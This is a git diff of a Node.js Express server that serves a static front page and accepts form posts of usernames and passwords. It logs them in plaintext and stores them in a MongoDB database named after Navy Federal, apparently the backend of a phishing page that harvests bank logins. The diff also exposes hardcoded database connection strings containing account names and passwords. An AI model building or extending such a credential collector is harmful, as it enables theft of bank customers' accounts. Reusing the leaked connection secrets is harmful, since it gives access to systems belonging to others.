@@ -1,60 +1,14 @@
-// const express = require('express');
-// const { MongoClient } = require('mongodb');
-// const app = express();
-// const port = 3000;
-
-// // MongoDB connection string
-// // const uri = process.env.MONGODB_CONNECT || "mongodb+srv://tylercrosson23:June23Csml.@navy-pjcjbaz.mongodb.net/"
-
-// const uri = "mongodb+srv://phindCode:phindCode@cluster0.kcfnncd.mongodb.net/navy_federal"
-// console.log(uri)
-
-// let client;
-
-// // Function to connect to MongoDB
-// async function connectDB() {
-//   if (client) return client;
-//   client = await MongoClient.connect(uri, {
-//     useNewUrlParser: true,
-//     useUnifiedTopology: true,
-//   });
-//   return client;
-// }
-// const cors = require('cors');
-// app.use(cors());
-
-
-// // Middleware to parse JSON bodies
-// app.use(express.json());
-
-// // POST endpoint to handle form submissions
-// app.post('/submit-form', async (req, res) => {
-//   await connectDB();
-//   const db = client.db('navy_federal'); // Replace 'mydatabase' with your actual database name
-//   const usersCollection = db.collection('users');
-
-//   // Extract form data from req.body
-//     const { username, password } = req.body;
-//     console.log(username, password)
-
-//   // Insert the form data into MongoDB
-//     const result = await usersCollection.insertOne({ username, password });
-//     console.log(result)
-
-//   res.status(200).send('Form data submitted successfully');
-// });
-
-// // Start the server
-// app.listen(port, () => {
-//   console.log(`Server running at http://localhost:${port}`);
-// });
-
 
 const express = require('express');
 const { MongoClient } = require('mongodb');
 const cors = require('cors');
 const app = express();
 const port = 3000;
+
+app.use(cors());
+app.use(express.json());
+// Serve static files from the 'public' directory
+app.use(express.static('public'));
 
 // MongoDB connection string
 // const uri = "mongodb+srv://phindCode:phindCode@cluster0.kcfnncd.mongodb.net/navy_federal"
@@ -80,8 +34,12 @@ async function connectDB() {
   return client;
 }
 
-app.use(cors());
-app.use(express.json());
+
+// Route handler for the root path
+app.get('/', (req, res) => {
+  res.sendFile(__dirname + '/public/index.html'); // Adjust the path according to your file structure
+});
+
 
 // POST endpoint to handle form submissions
 app.post('/submit-form', async (req, res) => {
